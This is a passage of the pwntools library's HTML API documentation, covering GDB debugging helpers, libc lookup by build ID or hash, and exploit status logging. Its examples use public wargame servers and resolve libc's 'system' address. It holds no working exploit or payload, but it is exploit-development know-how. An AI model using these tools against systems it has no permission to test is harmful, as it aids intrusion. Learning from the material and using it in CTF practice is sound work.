are installed on your machine.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Create a new process, and stop it at &#39;main&#39;</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">break main</span>
<span class="s1">continue</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>When GDB opens via <a class="reference internal" href="#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">debug()</span></code></a>, it will initially be stopped on the very first
instruction of the dynamic linker (<code class="docutils literal"><span class="pre">ld.so</span></code>) for dynamically-linked binaries.</p>
<p>Only the target binary and the linker will be loaded in memory, so you cannot
set breakpoints on shared library routines like <code class="docutils literal"><span class="pre">malloc</span></code> since <code class="docutils literal"><span class="pre">libc.so</span></code>
has not even been loaded yet.</p>
<p>There are several ways to handle this:</p>
<ol class="arabic simple">
<li><dl class="first docutils">
<dt>Set a breakpoint on the executable&#8217;s entry point (generally, <code class="docutils literal"><span class="pre">_start</span></code>)</dt>
<dd><ul class="first last">
<li>This is only invoked after all of the required shared libraries
are loaded.</li>
<li>You can generally get the address via the GDB command <code class="docutils literal"><span class="pre">info</span> <span class="pre">file</span></code>.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Use pending breakpoints via <code class="docutils literal"><span class="pre">set</span> <span class="pre">breakpoint</span> <span class="pre">pending</span> <span class="pre">on</span></code></dt>
<dd><ul class="first last">
<li>This has the side-effect of setting breakpoints for <strong>every</strong> function
which matches the name.  For <code class="docutils literal"><span class="pre">malloc</span></code>, this will generally set a
breakpoint in the executable&#8217;s PLT, in the linker&#8217;s internal <code class="docutils literal"><span class="pre">malloc</span></code>,
and eventaully in <code class="docutils literal"><span class="pre">libc</span></code>&#8216;s malloc.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Wait for libraries to be loaded with <code class="docutils literal"><span class="pre">set</span> <span class="pre">stop-on-solib-event</span> <span class="pre">1</span></code></dt>
<dd><ul class="first last">
<li>There is no way to stop on any specific library being loaded, and sometimes
multiple libraries are loaded and only a single breakpoint is issued.</li>
<li>Generally, you just add a few <code class="docutils literal"><span class="pre">continue</span></code> commands until things are set up
the way you want it to be.</li>
</ul>
</dd>
</dl>
</li>
</ol>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Create a new process, and stop it at &#39;main&#39;</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1"># Wait until we hit the main executable&#39;s entry point</span>
<span class="s1">break _start</span>
<span class="s1">continue</span>

<span class="s1"># Now set breakpoint on shared library routines</span>
<span class="s1">break malloc</span>
<span class="s1">break free</span>
<span class="s1">continue</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>You can use <a class="reference internal" href="#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">debug()</span></code></a> to spawn new processes on remote machines as well,
by using the <code class="docutils literal"><span class="pre">ssh=</span></code> keyword to pass in your <a class="reference internal" href="index.html#pwnlib.tubes.ssh.ssh" title="pwnlib.tubes.ssh.ssh"><code class="xref py py-class docutils literal"><span class="pre">ssh</span></code></a> instance.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Connect to the SSH server</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;passcode&#39;</span><span class="p">,</span> <span class="s1">&#39;pwnable.kr&#39;</span><span class="p">,</span> <span class="mi">2222</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">)</span>

<span class="c1"># Start a process on the server</span>
<span class="n">bash</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="s1">&#39;bash&#39;</span><span class="p">],</span>
                <span class="n">ssh</span><span class="o">=</span><span class="n">shell</span><span class="p">,</span>
                <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">break main</span>
<span class="s1">continue</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.debug_assembly">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">debug_assembly</code><span class="sig-paren">(</span><em>asm</em>, <em>gdbscript=None</em>, <em>vma=None</em><span class="sig-paren">)</span> &#x2192; tube<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.debug_assembly" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates an ELF file, and launches it under a debugger.</p>
<p>This is identical to debug_shellcode, except that
any defined symbols are available in GDB, and it
saves you the explicit call to asm().</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>asm</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Assembly code to debug</li>
<li><strong>gdbscript</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Script to run in GDB</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Base address to load the shellcode at</li>
<li><strong>**kwargs</strong> &#8211; Override any <a class="reference internal" href="index.html#module-pwnlib.context" title="pwnlib.context"><code class="xref py py-obj docutils literal"><span class="pre">context</span></code></a> values.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a></p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.debug_shellcode">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">debug_shellcode</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.debug_shellcode" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates an ELF file, and launches it under a debugger.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Assembled shellcode bytes</li>
<li><strong>gdbscript</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Script to run in GDB</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Base address to load the shellcode at</li>
<li><strong>**kwargs</strong> &#8211; Override any <a class="reference internal" href="index.html#module-pwnlib.context" title="pwnlib.context"><code class="xref py py-obj docutils literal"><span class="pre">context</span></code></a> values.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a></p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.find_module_addresses">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">find_module_addresses</code><span class="sig-paren">(</span><em>binary</em>, <em>ssh=None</em>, <em>ulimit=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L724-848"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.find_module_addresses" title="Permalink to this definition">¶</a></dt>
<dd><p>Cheat to find modules by using GDB.</p>
<p>We can&#8217;t use <code class="docutils literal"><span class="pre">/proc/$pid/map</span></code> since some servers forbid it.
This breaks <code class="docutils literal"><span class="pre">info</span> <span class="pre">proc</span></code> in GDB, but <code class="docutils literal"><span class="pre">info</span> <span class="pre">sharedlibrary</span></code> still works.
Additionally, <code class="docutils literal"><span class="pre">info</span> <span class="pre">sharedlibrary</span></code> works on FreeBSD, which may not have
procfs enabled or accessible.</p>
<p>The output looks like this:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">info</span> <span class="n">proc</span> <span class="n">mapping</span>
<span class="n">process</span> <span class="mi">13961</span>
<span class="n">warning</span><span class="p">:</span> <span class="n">unable</span> <span class="n">to</span> <span class="nb">open</span> <span class="o">/</span><span class="n">proc</span> <span class="n">file</span> <span class="s1">&#39;/proc/13961/maps&#39;</span>

<span class="n">info</span> <span class="n">sharedlibrary</span>
<span class="n">From</span>        <span class="n">To</span>          <span class="n">Syms</span> <span class="n">Read</span>   <span class="n">Shared</span> <span class="n">Object</span> <span class="n">Library</span>
<span class="mh">0xf7fdc820</span>  <span class="mh">0xf7ff505f</span>  <span class="n">Yes</span> <span class="p">(</span><span class="o">*</span><span class="p">)</span>     <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
<span class="mh">0xf7fbb650</span>  <span class="mh">0xf7fc79f8</span>  <span class="n">Yes</span>         <span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">libpthread</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">0</span>
<span class="mh">0xf7e26f10</span>  <span class="mh">0xf7f5b51c</span>  <span class="n">Yes</span> <span class="p">(</span><span class="o">*</span><span class="p">)</span>     <span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
<span class="p">(</span><span class="o">*</span><span class="p">):</span> <span class="n">Shared</span> <span class="n">library</span> <span class="ow">is</span> <span class="n">missing</span> <span class="n">debugging</span> <span class="n">information</span><span class="o">.</span>
</pre></div>
</div>
<p>Note that the raw addresses provided by <code class="docutils literal"><span class="pre">info</span> <span class="pre">sharedlibrary</span></code> are actually
the address of the <code class="docutils literal"><span class="pre">.text</span></code> segment, not the image base address.</p>
<p>This routine automates the entire process of:</p>
<ol class="arabic simple">
<li>Downloading the binaries from the remote server</li>
<li>Scraping GDB for the information</li>
<li>Loading each library into an ELF</li>
<li>Fixing up the base address vs. the <code class="docutils literal"><span class="pre">.text</span></code> segment address</li>
</ol>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>binary</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the binary on the remote server</li>
<li><strong>ssh</strong> (<a class="reference internal" href="index.html#module-pwnlib.tubes.tube" title="pwnlib.tubes.tube"><em>pwnlib.tubes.tube</em></a>) &#8211; SSH connection through which to load the libraries.
If left as <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, will use a <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a>.</li>
<li><strong>ulimit</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to <code class="xref py py-const docutils literal"><span class="pre">True</span></code> to run &#8220;ulimit -s unlimited&#8221; before GDB.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A list of pwnlib.elf.ELF objects, with correct base addresses.</p>
</td>
</tr>
</tbody>
</table>
<p>Example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="mi">9999</span><span class="p">):</span> 
<span class="gp">... </span>    <span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;bandit.labs.overthewire.org&#39;</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2220</span><span class="p">)</span>
<span class="gp">... </span>    <span class="n">bash_libs</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">find_module_addresses</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">bash_libs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">path</span><span class="p">)</span> 
<span class="go">&#39;libc.so.6&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bash_libs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span> 
<span class="go">&#39;0x7ffff7634660&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.version">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">version</code><span class="sig-paren">(</span><em>program='gdb'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L892-916"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.version" title="Permalink to this definition">¶</a></dt>
<dd><p>Gets the current GDB version.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p>Requires that GDB version meets the following format:</p>
<p class="last"><code class="docutils literal"><span class="pre">GNU</span> <span class="pre">gdb</span> <span class="pre">(GDB)</span> <span class="pre">7.12</span></code></p>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body"><em>tuple</em> &#8211; A tuple containing the version numbers</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">version</span><span class="p">()</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
</div>
</div>
<span id="document-libcdb"></span><div class="section" id="module-pwnlib.libcdb">
<span id="pwnlib-libcdb-libc-database"></span><h3><a class="reference internal" href="#module-pwnlib.libcdb" title="pwnlib.libcdb"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.libcdb</span></code></a> &#8212; Libc Database<a class="headerlink" href="#module-pwnlib.libcdb" title="Permalink to this headline">¶</a></h3>
<p>Fetch a LIBC binary based on some heuristics.</p>
<dl class="function">
<dt id="pwnlib.libcdb.get_build_id_offsets">
<code class="descclassname">pwnlib.libcdb.</code><code class="descname">get_build_id_offsets</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/libcdb.py#L162-211"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.libcdb.get_build_id_offsets" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a list of file offsets where the Build ID should reside within
an ELF file of the currentlys-elected architecture.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.libcdb.search_by_build_id">
<code class="descclassname">pwnlib.libcdb.</code><code class="descname">search_by_build_id</code><span class="sig-paren">(</span><em>hex_encoded_id</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/libcdb.py#L78-96"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.libcdb.search_by_build_id" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a hex-encoded Build ID, attempt to download a matching libc from libcdb.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>hex_encoded_id</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Hex-encoded Build ID (e.g. &#8216;ABCDEF...&#8217;) of the library</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Path to the downloaded library on disk, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">filename</span> <span class="o">=</span> <span class="n">search_by_build_id</span><span class="p">(</span><span class="s1">&#39;fe136e485814fee2268cf19e5c124ed0f73f4400&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
<span class="go">&#39;0xda260&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kc">None</span> <span class="o">==</span> <span class="n">search_by_build_id</span><span class="p">(</span><span class="s1">&#39;XX&#39;</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.libcdb.search_by_sha1">
<code class="descclassname">pwnlib.libcdb.</code><code class="descname">search_by_sha1</code><span class="sig-paren">(</span><em>hex_encoded_id</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/libcdb.py#L118-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.libcdb.search_by_sha1" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a hex-encoded sha1, attempt to download a matching libc from libcdb.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>hex_encoded_id</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Hex-encoded Build ID (e.g. &#8216;ABCDEF...&#8217;) of the library</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Path to the downloaded library on disk, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">filename</span> <span class="o">=</span> <span class="n">search_by_sha1</span><span class="p">(</span><span class="s1">&#39;34471e355a5e71400b9d65e78d2cd6ce7fc49de5&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
<span class="go">&#39;0xda260&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kc">None</span> <span class="o">==</span> <span class="n">search_by_sha1</span><span class="p">(</span><span class="s1">&#39;XX&#39;</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.libcdb.search_by_sha256">
<code class="descclassname">pwnlib.libcdb.</code><code class="descname">search_by_sha256</code><span class="sig-paren">(</span><em>hex_encoded_id</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/libcdb.py#L139-157"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.libcdb.search_by_sha256" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a hex-encoded sha256, attempt to download a matching libc from libcdb.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>hex_encoded_id</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Hex-encoded Build ID (e.g. &#8216;ABCDEF...&#8217;) of the library</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Path to the downloaded library on disk, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">filename</span> <span class="o">=</span> <span class="n">search_by_sha256</span><span class="p">(</span><span class="s1">&#39;5e877a8272da934812d2d1f9ee94f73c77c790cbc5d8251f5322389fc9667f21&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
<span class="go">&#39;0xda260&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kc">None</span> <span class="o">==</span> <span class="n">search_by_sha256</span><span class="p">(</span><span class="s1">&#39;XX&#39;</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.libcdb.search_by_md5">
<code class="descclassname">pwnlib.libcdb.</code><code class="descname">search_by_md5</code><span class="sig-paren">(</span><em>hex_encoded_id</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/libcdb.py#L98-116"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.libcdb.search_by_md5" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a hex-encoded md5sum, attempt to download a matching libc from libcdb.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>hex_encoded_id</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Hex-encoded Build ID (e.g. &#8216;ABCDEF...&#8217;) of the library</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Path to the downloaded library on disk, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">filename</span> <span class="o">=</span> <span class="n">search_by_md5</span><span class="p">(</span><span class="s1">&#39;7a71dafb87606f360043dcd638e411bd&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
<span class="go">&#39;0xda260&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kc">None</span> <span class="o">==</span> <span class="n">search_by_build_id</span><span class="p">(</span><span class="s1">&#39;XX&#39;</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-log"></span><div class="section" id="module-pwnlib.log">
<span id="pwnlib-log-logging-stuff"></span><h3><a class="reference internal" href="#module-pwnlib.log" title="pwnlib.log"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.log</span></code></a> &#8212; Logging stuff<a class="headerlink" href="#module-pwnlib.log" title="Permalink to this headline">¶</a></h3>
<p>Logging module for printing status during an exploit, and internally
within <code class="docutils literal"><span class="pre">pwntools</span></code>.</p>
<div class="section" id="exploit-developers">
<h4>Exploit Developers<a class="headerlink" href="#exploit-developers" title="Permalink to this headline">¶</a></h4>
<p>By using the standard <code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code>, an object named <code class="docutils literal"><span class="pre">log</span></code> will
be inserted into the global namespace.  You can use this to print out
status messages during exploitation.</p>
<p>For example,:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Hello, world!&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>prints:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[*] Hello, world!
</pre></div>
</div>
<p>Additionally, there are some nifty mechanisms for performing status updates
on a running job (e.g. when brute-forcing).:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s1">&#39;Working&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s1">&#39;Reticulating splines&#39;</span><span class="p">)</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Got a shell!&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>The verbosity of logging can be most easily controlled by setting
<code class="docutils literal"><span class="pre">log_level</span></code> on the global <code class="docutils literal"><span class="pre">context</span></code> object.:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;No you see me&quot;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Now you don&#39;t&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>The purpose of this attribute is to control what gets printed to the screen,
not what gets emitted. This means that you can put all logging events into
a log file, while only wanting to see a small subset of them on your screen.</p>
</div>
<div class="section" id="pwnlib-developers">
<h4>Pwnlib Developers<a class="headerlink" href="#pwnlib-developers" title="Permalink to this headline">¶</a></h4>
<p>A module-specific logger can be imported into the module via:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwnlib.log</span> <span class="k">import</span> <span class="n">getLogger</span>
<span class="n">log</span> <span class="o">=</span> <span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</pre></div>
</div>
<p>This provides an easy way to filter logging programmatically
or via a configuration file for debugging.</p>
<p>When using <code class="docutils literal"><span class="pre">progress</span></code>, you should use the <code class="docutils literal"><span class="pre">with</span></code>
keyword to manage scoping, to ensure the spinner stops if an
exception is thrown.</p>
</div>
<div class="section" id="technical-details">
<h4>Technical details<a class="headerlink" href="#technical-details" title="Permalink to this headline">¶</a></h4>
<p>Familiarity with the <a class="reference external" href="https://docs.python.org/2.7/library/logging.html#module-logging" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">logging</span></code></a> module is assumed.</p>
<p>A pwnlib root logger named &#8216;pwnlib&#8217; is created and a custom handler and
formatter is installed for it.  The handler determines its logging level from
<code class="xref py py-data docutils literal"><span class="pre">context.log_level</span></code>.</p>
<p>Ideally <code class="xref py py-data docutils literal"><span class="pre">context.log_level</span></code> should only affect which records will be
emitted by the handler such that e.g. logging to a file will not be changed by
it. But for performance reasons it is not feasible log everything in the normal
case. In particular there are tight loops inside <a class="reference internal" href="index.html#module-pwnlib.tubes.tube" title="pwnlib.tubes.tube"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.tube</span></code></a>, which
we would like to be able to debug, but if we are not debugging them, they should
not spit out messages (even to a log file). For this reason there are a few places
inside pwnlib, that will not even emit a record without <code class="xref py py-data docutils literal"><span class="pre">context.log_level</span></code>
being set to <cite>logging.DEBUG</cite> or below.</p>
<p>Log records created by <code class="docutils literal"><span class="pre">Progress</span></code> and <code class="docutils literal"><span class="pre">Logger</span></code> objects will set
